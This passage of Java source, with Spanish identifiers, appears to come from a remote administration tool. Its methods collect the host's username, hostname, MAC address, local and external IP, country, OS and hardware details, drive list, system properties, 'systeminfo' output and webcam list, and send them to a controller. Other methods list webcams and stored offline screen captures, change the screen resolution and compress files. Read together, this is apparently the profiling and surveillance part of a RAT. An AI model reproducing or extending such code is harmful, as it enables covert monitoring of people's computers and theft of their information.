                    datos[i] = "" + (i + 1) + ":" + (int) monitores[i].getDisplayMode().getWidth() + ":" + (int) monitores[i].getDisplayMode().getHeight();
                }
                servicio.ejecutar(3, Protocolo.GET_LISTA_MONITORES, datos);
            }
        } catch (Exception e) {
        }
    }

    private void enviarListaResoluciones() {
        try {
            GraphicsEnvironment g = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] monitores = g.getScreenDevices();
            List<String> datos = new ArrayList<String>();
            if (monitores != null && monitores.length > 0) {
                for (GraphicsDevice monitor : monitores) {
                    for (DisplayMode displayMode : monitor.getDisplayModes()) {
                        datos.add((int) displayMode.getWidth() + "x" + (int) displayMode.getHeight());
                    }
                }
                servicio.ejecutar(3, Protocolo.GET_LISTA_RESOLUCION, datos);
            }
        } catch (Exception e) {

        }
    }

    private void cambiarResolucion(String resolucion) {
        int ancho = 0;
        int alto = 0;
        try {
            ancho = Integer.parseInt(resolucion.split("x")[0]);
            alto = Integer.parseInt(resolucion.split("x")[1]);
            GraphicsEnvironment g = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] monitores = g.getScreenDevices();
            if (monitores != null && monitores.length > 0) {
                for (int i = 0; i < monitores.length; i++) {
                    for (DisplayMode displayMode : monitores[i].getDisplayModes()) {
                        if (displayMode.getWidth() == ancho && displayMode.getHeight() == alto) {
                            g.getScreenDevices()[i].setDisplayMode(displayMode);
                        }
                    }
                }
            }
        } catch (Exception e) {
            //intento cambiar la resolucion nativamente
            if (UtilRT.isLinux()) {
                //xrandr -s 1400x1050                     
                try {
                    Process p = Runtime.getRuntime().exec(new String[]{"xrandr", "-s", resolucion});
                } catch (Exception e1) {
                }
            }
        }
    }

    private String getExternalIp() {
        String ip = "";
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = null;
            try {
                in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
                ip = in.readLine();
                return ip;
            } finally {
                if (in != null) {
                    in.close();
                }
            }
        } catch (Exception e) {
        }
        return ip;
    }

    private String getMacAddress(String prefijo) {
        String mac = "";
        try {
            mac = UtilRT.getMacAddress1(prefijo);
            if (mac.equalsIgnoreCase("00-00-00-00-00-00-00-E0")) {
                mac = UtilRT.getMacAddress2(prefijo);
            }
        } catch (Exception e) {
        }
        return mac;
    }

    private void listarOffline() {
        StringBuilder retorno = new StringBuilder();
        try {
//            File f = ((File) capturadorOffline.get(6));//la carpeta donde se almacenaran las
            File f = ((File) ((Interfaz) servicio.get(12)).get(6));//la carpeta donde se almacenaran las
            if (f != null && f.exists()) {
                retorno.append("Carpeta de capturas: ").append(f.getAbsolutePath()).append(fl);
                retorno.append("==========================================================").append(fl);
                for (File ff : f.listFiles()) {
                    retorno.append("Archivo: ").append(ff.getAbsolutePath()).append(fl);
                    retorno.append("Tamaño: ").append(UtilRT.convertirBytesLecturaHumana(ff.length())).append(fl);
                    try {
                        retorno.append("Capturas: ").append(UtilRT.contarObjetos(ff.getAbsolutePath())).append(fl);
                    } catch (Exception e) {
                    }
                    retorno.append("---------------------------------------------------------").append(fl);
                }

            } else {
                retorno.append("No Existe archivo de capturas de pantalla");
            }

        } catch (Exception e) {
            retorno.append("NO EXISTEN ARCHIVOS\n");
            retorno.append("Error:").append(e.getMessage());
        }
        servicio.ejecutar(3, Protocolo.GET_LISTA_OFFLINE, retorno.toString());

    }

    private void enviarInfoInicial(String puertoTrans, String prefijo, String iplocal, Accion accion) {
        try {
            StringBuilder info = new StringBuilder("");
            String usuario = System.getProperty("user.name");
            //String os = System.getProperty("os.name") + " " + System.getProperty("os.version") + " " + System.getProperty("os.arch");
            String os = UtilRT.OS_NOMBRE + " (" + UtilRT.OS_PLATAFORMA + ") " + UtilRT.OS_VERSION + " " + UtilRT.OS_ARQUITECTURA;
            String jre = System.getProperty("java.runtime.version");
            String version = Inicio.v;
//            String ipexterna = this.conexion.getInetAddress().getHostAddress();
            String ipexterna = getExternalIp();
            if (Inicio.i.equals("")) {
                Inicio.i = getMacAddress(prefijo) + " (" + Inicio.v + ")";
            }
            String identificador = Inicio.i;
            String pais = Locale.getDefault().getDisplayCountry();
            String paisSig = Locale.getDefault().getCountry();
            String hostname = (String) servicio.get(0);
            String tieneCam;
            try {
                WebCamInterface wci = ((WebCamInterface) Class.forName("comunes.ObtenerWebCam").newInstance());
                WebCamItem[] p = wci.listar();
                wci = null;
                tieneCam = p != null && p.length > 0 ? "SI (" + p.length + ")" : "NO";
            } catch (Exception e) {
                tieneCam = "Sin plugin";
            }
            info.append(pais).append("#").append(paisSig).append(":").
                    append(identificador).append(":").append(ipexterna).
                    append(":").append(iplocal).append(":").append(usuario).
                    append(":").append(hostname).append(":").append(tieneCam).
                    append(":").append(os).append(":").append(jre).append(":").append(version);
            servicio.ejecutar(3, Protocolo.INFO, info.toString());
        } catch (Exception e) {

        }
        servicio.ejecutar(3, Protocolo.PUERTO_TRANSFERENCIA, puertoTrans);

        if (accion != null) {
            accion.ejecutar();
        }
    }

    private void enviarListaWebCamsDimensiones() {
        try {
            Dimension[] p = ((WebCamInterface) Class.forName("comunes.ObtenerWebCam").newInstance()).listarResoluciones();
            if (p != null && p.length > 0) {
                servicio.ejecutar(3, Protocolo.GET_LISTA_DIMENSIONES_CAM, p);
            }
        } catch (Exception e) {
        }
    }

    private void enviarListaWebCams() {
        try {
            WebCamItem[] p = ((WebCamInterface) Class.forName("comunes.ObtenerWebCam").newInstance()).listar();
            if (p != null && p.length > 0) {
                servicio.ejecutar(3, Protocolo.LISTAR_WEBCAMS, p);
            }
        } catch (Exception e) {
        }
    }

    private void enviarInfoCompleta(String puertoTrans, String prefijo, String localIP) {
        try {

            int largo = 21;
            int largoTitulo = 75;

            String li = "==============================================================================\n";
            long ramLibre = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getFreePhysicalMemorySize();
            long ram = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
            double carCPU = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getProcessCpuLoad() * 100;
            double carCPU1 = ((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getSystemCpuLoad() * 100;
            int cores = Runtime.getRuntime().availableProcessors();
            GraphicsEnvironment g = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] monitores = g.getScreenDevices();
            File server = new File(Inicio.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            StringBuilder inf = new StringBuilder();
//            inf.append("===================== INFORMACIÓN SERVIDOR ===================================\n");
            inf.append(fl).append(UtilRT.crearTituloString("INFORMACIÓN SERVIDOR", largoTitulo)).append(fl);
            inf.append(UtilRT.rellenarEspacios("Servicios ejecutando", largo)).append(":").append(Inicio.con.size()).append(fl);
            inf.append(UtilRT.rellenarEspacios("", largo)).append("[").append(Inicio.h()).append("]\n");
            inf.append(UtilRT.rellenarEspacios("Servicios conectados", largo)).append(":").append(Inicio.c()).append(fl);
            inf.append(UtilRT.rellenarEspacios("", largo)).append("[").append(Inicio.hc()).append("]\n");
            inf.append(UtilRT.rellenarEspacios("Versión del servidor", largo)).append(":").append(Inicio.v).append(fl);
            inf.append(UtilRT.rellenarEspacios("Ruta del servidor", largo)).append(":").append(server.getParent()).append(fl);
            inf.append(UtilRT.rellenarEspacios("Puerto", largo)).append(":").append(servicio.get(3)).append(fl);
//            inf.append(UtilRT.rellenarEspacios("Puerto transferencia", largo)).append(":").append(puertoTrans).append(fl);
            inf.append(UtilRT.rellenarEspacios("Captura offline", largo)).append(":").append((Boolean) servicio.get(8) ? "SI" : "NO").append(fl);

//            inf.append("\n===================== SSL =====================================\n");
            inf.append(fl).append(UtilRT.crearTituloString("SSL", largoTitulo)).append(fl);

            inf.append(UtilRT.rellenarEspacios("SSL", largo)).append(":").append((Boolean) Inicio.config.obtenerParametro("ssl") ? "SI" : "NO").append(fl);
            if ((Boolean) Inicio.config.obtenerParametro("ssl")) {
                inf.append(UtilRT.rellenarEspacios("Información SSL", largo)).append(":").append(((Conexion) servicio.get(14)).getSSlInfo()).append(fl);
            }

//            inf.append("\n===================== INFORMACIÓN EQUIPO =====================================\n");
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss z Z");
            inf.append(fl).append(UtilRT.crearTituloString("INFORMACIÓN EQUIPO", largoTitulo)).append(fl);
            inf.append(UtilRT.rellenarEspacios("Usuario", largo)).append(":").append(System.getProperty("user.name")).append(fl);
            //inf.append("SO\t: ").append(System.getProperty("os.name")).append(" ").append(System.getProperty("os.version")).append(" ").append(System.getProperty("os.arch")).append(fl);
            inf.append(UtilRT.rellenarEspacios("SO", largo)).append(":").append(UtilRT.OS_NOMBRE).append(" (").append(UtilRT.OS_PLATAFORMA).append(") ").append(UtilRT.OS_VERSION).append(" ").append(UtilRT.OS_ARQUITECTURA).append(fl);
            inf.append(UtilRT.rellenarEspacios("RAM libre", largo)).append(":").append(UtilRT.convertirBytesLecturaHumana(ramLibre)).append(fl);
            inf.append(UtilRT.rellenarEspacios("RAM", largo)).append(":").append(UtilRT.convertirBytesLecturaHumana(ram)).append(fl);
            inf.append(UtilRT.rellenarEspacios("CPU Procesos carga", largo)).append(":").append(UtilRT.redondear(carCPU, 2)).append("%\n");
            inf.append(UtilRT.rellenarEspacios("CPU Sistema carga", largo)).append(":").append(UtilRT.redondear(carCPU1, 2)).append("%\n");
            inf.append(UtilRT.rellenarEspacios("Procesadores", largo)).append(":").append(cores).append(fl);
            inf.append(UtilRT.rellenarEspacios("Versión JRE", largo)).append(":").append(System.getProperty("java.runtime.version")).append(fl);
            inf.append(UtilRT.rellenarEspacios("IP Externa", largo)).append(":").append(getExternalIp()).append(fl);
            inf.append(UtilRT.rellenarEspacios("IP Local", largo)).append(":").append(localIP).append(fl);
            inf.append(UtilRT.rellenarEspacios("Hostname", largo)).append(":").append((String) servicio.get(0)).append(fl);
            inf.append(UtilRT.rellenarEspacios("Dirección MAC", largo)).append(":").append(getMacAddress(prefijo)).append(fl);
            inf.append(UtilRT.rellenarEspacios("Pais", largo)).append(":").append(Locale.getDefault().getDisplayCountry()).append(fl);
            inf.append(UtilRT.rellenarEspacios("Fecha", largo)).append(":").append(sdf.format(new Date())).append(fl);

//            inf.append("\n===================== CONFIGURACION =====================================\n");
            inf.append(fl).append(UtilRT.crearTituloString("CONFIGURACION", largoTitulo)).append(fl);
            try {
                inf.append(Inicio.config.toString()).append(fl);
            } catch (Exception e) { // solo un monitor resolucion

            }

            String tieneCam;

//            inf.append("\n===================== MONITORES =====================================\n");
            inf.append(fl).append(UtilRT.crearTituloString("MONITORES", largoTitulo)).append(fl);
            try {

                inf.append(UtilRT.rellenarEspacios("Monitores", largo)).append(":").append(monitores.length).append(fl);
                int i = 0;
                for (GraphicsDevice dev : monitores) {
                    i++;
                    inf.append(UtilRT.rellenarEspacios("Monitor [" + i + "]", largo)).append(":").append((int) dev.getDisplayMode().getWidth()).append("x").append((int) dev.getDisplayMode().getHeight()).append(fl);
                    inf.append(UtilRT.rellenarEspacios("    Id String", largo)).append(":").append(dev.getIDstring()).append(fl);
                    inf.append(UtilRT.rellenarEspacios("    Memoria", largo)).append(":").append(UtilRT.convertirBytesLecturaHumana(dev.getAvailableAcceleratedMemory())).append(fl);
                    inf.append(UtilRT.rellenarEspacios("    Tipo", largo)).append(":").append(dev.getType() == GraphicsDevice.TYPE_IMAGE_BUFFER ? "BUFFER IMAGE" : (dev.getType() == GraphicsDevice.TYPE_RASTER_SCREEN ? "RASTER SCREEN" : "PRINTER")).append(fl);
                }
            } catch (Exception e) { // solo un monitor resolucion
                Dimension d = Toolkit.getDefaultToolkit().getScreenSize();
                inf.append(UtilRT.rellenarEspacios("Resolución monitor", largo)).append(":").append((int) d.getWidth()).append("x").append((int) d.getHeight()).append(fl);
            }
//            inf.append("\n===================== CAMARAS =====================================\n");
            inf.append(fl).append(UtilRT.crearTituloString("CAMARAS", largoTitulo)).append(fl);
            try {
                WebCamItem[] p = ((WebCamInterface) Class.forName("comunes.ObtenerWebCam").newInstance()).listar();
                tieneCam = p != null && p.length > 0 ? "SI (" + p.length + ")" : "NO";
                inf.append(UtilRT.rellenarEspacios("Cámaras", largo)).append(":").append(tieneCam).append(fl);
                if (p != null && p.length > 0) {
                    for (WebCamItem cam : p) {
                        inf.append(UtilRT.rellenarEspacios("Nombre", largo)).append(":").append(cam.getNombre()).append(fl);
                    }
                }
            } catch (Exception e) {
                inf.append(UtilRT.rellenarEspacios("Cámaras", largo)).append(":").append("Sin plugin").append(fl);
            }

//            inf.append("\n===================== UNIDADES DEL SISTEMA DE ARCHIVOS =====================================\n");
            inf.append(fl).append(UtilRT.crearTituloString("UNIDADES DEL SISTEMA DE ARCHIVOS", largoTitulo)).append(fl);
            File[] ar = File.listRoots();
            if (ar != null) {
                if (ar.length > 0) {
                    for (File ar1 : ar) {
                        inf.append(UtilRT.rellenarEspacios("Unidad", largo)).append(":");
                        inf.append(ar1.getAbsolutePath()).append(fl);
                        inf.append(UtilRT.rellenarEspacios("Tamaño", largo)).append(":");
                        inf.append(UtilRT.convertirBytesLecturaHumana(ar1.getTotalSpace())).append(fl);
                        inf.append(UtilRT.rellenarEspacios("Libre", largo)).append(":");
                        inf.append(UtilRT.convertirBytesLecturaHumana(ar1.getFreeSpace())).append(fl);
                        inf.append(fl);
                    }
//                    inf.append(li);
                }
            }

//            inf.append("\n===================== VARIABLES DE JAVA =====================================\n");
            inf.append(fl).append(UtilRT.crearTituloString("VARIABLES DE JAVA", largoTitulo)).append(fl);
            //propiedades de java
//            int size = -2147483648;
//            List<String> propnames = new ArrayList();
//            for (Object entry : System.getProperties().keySet()) {
//                String name = entry.toString();
//                propnames.add(name);
//                if (name.length() > size) {
//                    size = name.length();
//                }
//            }
//            Collections.sort(propnames);
//            for (String propname : propnames) {
//                String propvalue = System.getProperty(propname);
//                if (propname.equals("line.separator")) {
//                    String hex = "";
//                    int i = propvalue.length();
//                    for (int idx = 0; idx < propvalue.length(); idx++) {
//                        int cc = propvalue.charAt(idx);
//                        hex = hex + "\\" + cc;
//                    }
//                    propvalue = hex;
//                }
//                inf.append(String.format("%" + size + "." + size + "s [%s]", new Object[]{propname, propvalue}));
//                inf.append(fl);
//            }

            int size = -2147483648;
            List<String> propnames = new ArrayList();
            for (Object entry : System.getProperties().keySet()) {
                String name = entry.toString();
                propnames.add(name);
                if (name.length() > size) {
                    size = name.length();
                }
            }
            Collections.sort(propnames);
            String propvalue;
            for (String propname : propnames) {
                propvalue = System.getProperty(propname);
                if (propname.equals("line.separator")) {
                    String hex = "";
                    int i = propvalue.length();
                    for (int idx = 0; idx < propvalue.length(); idx++) {
                        int cc = propvalue.charAt(idx);
                        hex = hex + "\\" + cc;
                    }
                    propvalue = hex;
                }
                inf.append(UtilRT.rellenarEspacios(propname, size)).append(":").append(propvalue).append(fl);
            }
            servicio.ejecutar(3, Protocolo.GET_INFO_COMPLETA, inf.toString());
        } catch (Exception ex) {
            servicio.ejecutar(3, Protocolo.GET_INFO_COMPLETA, "Error al obtener Información.\n" + ex.getMessage());

        }
    }

    private void enviarSysInfo() {
        try {
            if (UtilRT.isWindows()) {
                Process p = Runtime.getRuntime().exec(new String[]{"systeminfo"});
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "Cp850"));
                StringBuilder salida = new StringBuilder();
                String tmp;
                while ((tmp = br.readLine()) != null) {
                    salida.append(tmp).append(fl);
                }
                servicio.ejecutar(3, Protocolo.GET_INFO_COMPLETA, salida.toString());
            } else {
                servicio.ejecutar(6, "ERROR AL EJECUTAR SYSTEMINFO: El cliente no se ejecuta sobre Windows");
            }
        } catch (Exception ex) {
            servicio.ejecutar(6, "ERROR AL EJECUTAR SYSTEMINFO" + ex.getMessage());
        }
    }

    private void comprimir(String archivo) {
        try {
            UtilRT.comprimir(new File(archivo));
        } catch (Exception ex) {
        }
    }

    public void set(int opcion, Object valor) {

    }

    public Object get(int opcion, Object... parametros) {
        return null;
    }

    public void ejecutar(int opcion, Object... parametros) {

    }
}
